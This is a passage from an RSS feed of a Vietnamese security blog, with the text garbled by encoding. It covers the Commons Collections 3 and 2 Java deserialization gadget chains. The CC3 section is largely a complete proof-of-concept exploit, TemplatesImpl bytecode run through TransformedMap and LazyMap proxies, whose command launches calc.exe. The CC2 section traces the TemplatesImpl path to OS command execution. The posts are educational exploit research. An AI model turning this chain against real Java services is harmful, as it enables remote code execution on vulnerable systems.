javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(null);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test-value&quot;</span>);</span><br><span class="line">        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihClassConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihClassConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihObject</span> <span class="operator">=</span> aihClassConstructor.newInstance(Target.class, map);</span><br><span class="line">        serialize(aihObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XÃ¢y dá»±ng xong cháº¡y lÃªn thÃ¬ khÃ´ng tháº¥y mÃ¡y tÃ­nh báº­t :) check Ä‘i check láº¡i, tÆ°á»Ÿng lÃ  cÃ³ váº¥n Ä‘á» gÃ¬ hÃ³a ra jdk-1.8.0_342 mÃ¬nh Ä‘áº·t tÃªn lÃ  1.8.0_65 nÃªn khÃ´ng cháº¡y Ä‘Æ°á»£c :).</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2023/03/20/CommonsCollections3/TransformedMapResult.png"></p><p>CÃ¡i pháº§n nÃ y mÃ¬nh chá»‰ láº¥y láº¡i template tá»« bÃ i viáº¿t trÆ°á»›c, náº¿u cÃ¡c báº¡n chÆ°a xem thÃ¬ xem bÃ i Ä‘Ã³ Ä‘á»ƒ hiá»ƒu nÃ³ lÃ  gÃ¬ nhÃ©~</p><h3 id="ChainedTransformed-LazyMap"><a href="#ChainedTransformed-LazyMap" class="headerlink" title="ChainedTransformed + LazyMap"></a>ChainedTransformed + LazyMap</h3><p>Chain hoÃ n chá»‰nh:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        ctClass.setSuperclass(pool.get(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>));</span><br><span class="line">        ctClass.makeClassInitializer().setBody(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_nameField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _nameField.set(templates, <span class="string">&quot;notNull&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_classField</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        _classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _classField.set(templates, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _bytecodes.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        Field tfactoryField=templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        <span class="comment">//instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(null);</span></span><br><span class="line">        <span class="comment">//----------------------TransformedMap</span></span><br><span class="line"><span class="comment">//        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        hashMap.put(&quot;value&quot;, &quot;test-value&quot;);</span></span><br><span class="line"><span class="comment">//        Map&lt;Object, Object&gt; map = (TransformedMap) TransformedMap.decorate(hashMap, null, chainedTransformer);</span></span><br><span class="line"><span class="comment">//        Class aihClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span></span><br><span class="line"><span class="comment">//        Constructor aihClassConstructor = aihClass.getDeclaredConstructor(Class.class, Map.class);</span></span><br><span class="line"><span class="comment">//        aihClassConstructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        Object aihObject = aihClassConstructor.newInstance(Target.class, map);</span></span><br><span class="line"><span class="comment">//        serialize(aihObject);</span></span><br><span class="line"><span class="comment">//        unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">        <span class="comment">//-----------------------LazyMap</span></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line">        <span class="comment">//lazyMap.get(null);</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">aihClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">aihConstructor</span> <span class="operator">=</span> aihClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        aihConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">aihInstance</span> <span class="operator">=</span> (InvocationHandler) aihConstructor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(aihClass.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,aihInstance);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">aihProxyObject</span> <span class="operator">=</span> aihConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        serialize(aihProxyObject);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cháº¡y file vÃ  mÃ¡y tÃ­nh Ä‘Ã£ báº­t lÃªn!</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2023/03/20/CommonsCollections3/LazyMapResult.png"></p><p>Pháº§n thay Ä‘á»•i láº¥y tá»« cc1-lazymap, cÃ¡c báº¡n tÃ¬m láº¡i Ä‘á»c nhÃ©~</p><h2 id="Loi-ket"><a href="#Loi-ket" class="headerlink" title="Lá»i káº¿t"></a>Lá»i káº¿t</h2><p>Chain nÃ y cÅ©ng khÃ´ng cÃ³ gÃ¬ quÃ¡ khÃ³ khÄƒn vÃ¬ dá»±a trÃªn pháº§n Ä‘áº§u cá»§a cc1 vÃ  pháº§n Ä‘uÃ´i cá»§a cc2 mÃ  mÃ¬nh Ä‘Ã£ phÃ¢n tÃ­ch. Chá»‰ khÃ¡c lÃ  nÃ³ khÃ´ng Ä‘i qua <code>InvokerTranformer</code> mÃ  Ä‘i qua <code>InstantiateTransformer</code> káº¿t há»£p vá»›i <code>TrAXFilter</code>.<br>Qua ba bÃ i viáº¿t vá» ba gadget chains mÃ¬nh Ä‘Ã£ dáº§n tháº¥y quen vá»›i viá»‡c Ä‘á»c mÃ£ nguá»“n vÃ  sÃ¢u chuá»—i cÃ¡c hÃ m, class. Má»i thá»© dáº§n trá»Ÿ nÃªn dá»… dÃ ng hÆ¡n má»™t xÃ­u rá»“i. Hy vá»ng cÃ¡c báº¡n cÅ©ng nhÆ° mÃ¬nh!<br>Pháº§n nÃ y mÃ¬nh sá»­ dá»¥ng láº¡i cÃ¡c Ä‘oáº¡n code tá»« máº¥y chain trÆ°á»›c nÃªn náº¿u báº¡n chÆ°a hiá»ƒu thÃ¬ tÃ¬m Ä‘á»c nhÃ©.</p><blockquote><p>ChÃºc cÃ¡c báº¡n há»c tá»‘t~</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://rayinaw.github.io/categories/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/categories/Java/Deserialization/">Deserialization</category>
      
      
      <category domain="https://rayinaw.github.io/tags/Java/">Java</category>
      
      <category domain="https://rayinaw.github.io/tags/Deserialization/">Deserialization</category>
      
      <category domain="https://rayinaw.github.io/tags/Commons-Collections/">Commons Collections</category>
      
      
      <comments>https://rayinaw.github.io/2023/03/20/CommonsCollections3/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>PhÃ¢n tÃ­ch chuá»—i Commons Collections 2</title>
      <link>https://rayinaw.github.io/2022/12/16/CommonsCollections2/</link>
      <guid>https://rayinaw.github.io/2022/12/16/CommonsCollections2/</guid>
      <pubDate>Fri, 16 Dec 2022 03:05:45 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;Mot-vai-kien-thuc-can-nam&quot;&gt;&lt;a href=&quot;#Mot-vai-kien-thuc-can-nam&quot; class=&quot;headerlink&quot; title=&quot;Má»™t vÃ i kiáº¿n thá»©c cáº§n náº¯m&quot;&gt;&lt;/a&gt;Má»™t vÃ i kiáº¿</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="Mot-vai-kien-thuc-can-nam"><a href="#Mot-vai-kien-thuc-can-nam" class="headerlink" title="Má»™t vÃ i kiáº¿n thá»©c cáº§n náº¯m"></a>Má»™t vÃ i kiáº¿n thá»©c cáº§n náº¯m</h2><p>TrÆ°á»›c khi vÃ o bÃ i viáº¿t chÃºng ta cáº§n náº¯m má»™t sá»‘ kiáº¿n thá»©c sau:</p><ul><li><a href="https://self-learning-java-tutorial.blogspot.com/2020/04/javassist-tutorial.html">javassist</a></li><li>Hiá»ƒu Ä‘Æ°á»£c ChainedTransformer á»Ÿ CC1, náº¿u cÃ¡c báº¡n chÆ°a biáº¿t thÃ¬ tÃ¬m Ä‘á»c láº¡i bÃ i CC1-TransformedMap cá»§a mÃ¬nh nhÃ©.</li></ul><h2 id="Moi-truong"><a href="#Moi-truong" class="headerlink" title="MÃ´i trÆ°á»ng"></a>MÃ´i trÆ°á»ng</h2><ul><li>JDK8u65</li><li>Commons-Collections 4.0<br>ThÃªm Commons-Collections 4.0 vÃ o project báº±ng dependencies:<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="Phan-tich"><a href="#Phan-tich" class="headerlink" title="PhÃ¢n tÃ­ch"></a>PhÃ¢n tÃ­ch</h2><p>SÆ¡ Ä‘á»“ tÃ³m táº¯t chuá»—i.<br><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/11/04/Commons-Collections1-TransformedMap/mindmap.png"></p><p>Tá»« TemplateImpl Ä‘áº¿n OS Command</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br><span class="line">TemplatesImpl.defineTransletClasses()</span><br><span class="line">TransletClassLoader.defineClass()</span><br><span class="line">TemplatesImpl.getTransletInstance()-&gt;_class[_transletIndex].newInstance()</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="newTransformer"><a href="#newTransformer" class="headerlink" title="newTransformer()"></a>newTransformer()</h3><p>Trong lá»›p TemplateImpl tÃ¬m Ä‘áº¿n phÆ°Æ¡ng thá»©c TemplateImpl.newTransformer(). Trong phÆ°Æ¡ng thá»©c nÃ y nÃ³ gá»i Ä‘áº¿n TemplateImpl.getTranslateInstance(). Äi Ä‘áº¿n phÆ°Æ¡ng thá»©c nÃ y.</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/16/CommonsCollections2/TemplatesImplnewTransformer.png"></p><p>Trong phÆ°Æ¡ng thá»©c nÃ y, chÃºng ta cáº§n quan tÃ¢m Ä‘áº¿n phÆ°Æ¡ng thá»©c TemplateImpl.defineTransletClasses(). </p><p>Náº¿u _name khÃ´ng null vÃ  _class null thÃ¬ nÃ³ sáº½ gá»i Ä‘áº¿n TemplateImpl.defineTransletClasses(). Hai biáº¿n nÃ y hiá»‡n táº¡i mÃ¬nh váº«n chÆ°a rÃµ lÃ  gÃ¬ bá»Ÿi chÆ°a rÃµ lá»›p TemplateImpl, cá»© tiáº¿p tá»¥c thÃ´i.</p><h3 id="defineTransletClasses"><a href="#defineTransletClasses" class="headerlink" title="defineTransletClasses()"></a>defineTransletClasses()</h3><p>Äi Ä‘áº¿n phÆ°Æ¡ng thá»©c TemplateImpl.defineTransletClasses().</p><p><img src="https://raw.githubusercontent.com/rayinaw/rayinaw.github.io/main/2022/12/16/CommonsCollections2/defineTransletClasses.png"></p><p>Äáº§u tiÃªn Ä‘á»ƒ Ä‘i tiáº¿p, chÃºng ta cáº§n _bytecodes khÃ¡c null. </p><p>Trong phÆ°Æ¡ng thá»©c nÃ y nÃ³ thá»±c hiá»‡n táº¡o má»™t TransletClassLoader, TransletClassLoader lÃ  má»™t lá»›p con static cá»§a lá»›p TemplateImpl, vÃ  nÃ³ implement lá»›p Classloader. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TransletClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> (TransletClassLoader)</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>() &#123;</span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>loader nÃ y thá»±c hiá»‡n <code>_class[i] = loader.defineClass(_bytecodes[i])</code>, hÃ m nÃ y sáº½ thá»±c hiá»‡n phÆ°Æ¡ng thá»©c defineClass cá»§a lá»›p ClassLoader <code>ClassLoader.defineClass(null, b, 0, b.length)</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> defineClass(name, b, off, len, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len,</span><br><span class="line">                                     ProtectionDomain protectionDomain)</span><br><span class="line">    <span class="keyword">throws</span> ClassFormatError</span><br><span class="line">&#123;</span><br><span class="line">    protectionDomain = preDefineClass(name, protectionDomain);</span><br><span class="line">    <span class="type">String</span> <span class="variable">source</span> <span class="operator">=</span> defineClassSourceLocation(protectionDomain);</span><br><span class="line">    Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);</span><br><span class="line">    postDefineClass(c, protectionDomain);</span><br><span class="line">    <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MÃ£ nguá»“n cá»§a nÃ³ hÆ¡i khÃ³ hiá»ƒu nÃªn mÃ¬nh Ä‘á»c doc Ä‘á»ƒ biáº¿t nhanh chá»©c nÄƒng cá»§a phÆ°Æ¡ng thá»©c defineClass.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td 